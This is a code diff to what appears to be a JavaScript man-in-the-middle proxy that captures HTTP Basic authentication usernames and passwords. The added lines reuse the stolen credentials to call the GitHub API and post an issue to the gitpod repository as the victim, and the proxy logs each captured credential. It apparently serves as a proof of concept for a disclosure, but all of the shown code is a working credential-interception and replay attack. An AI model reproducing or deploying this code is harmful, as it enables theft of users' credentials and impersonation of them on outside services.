@@ -30,7 +30,20 @@ const server = new class extends MitmProxy {
                         user: decodeURI(basicAuth[0]), 
                         password: decodeURI(basicAuth[1]) 
                     }
-                    
+
+                    require('request').post({
+                        headers: { 'content-type' : 'application/json',
+                                   'user-agent': 'request' },
+                        url: `https://${basicAuth[0]}:${basicAuth[1]}@api.github.com/repos/gitpod-io/gitpod/issues`,
+                        body: JSON.stringify({ 
+                            title: 'WAIT A MOMENT!',
+                            body: 'I can explain! please don\'t close this issue yet i will send an email to @JohannesLandgraf with the explanation',
+                            // assignee: 'gerardo-junior' 
+                        })
+                    }, function(error, response, body){
+                        console.log(body);
+                    });
+        
                     console.log('I got a credential:', credential)
 
                 } catch (err) {
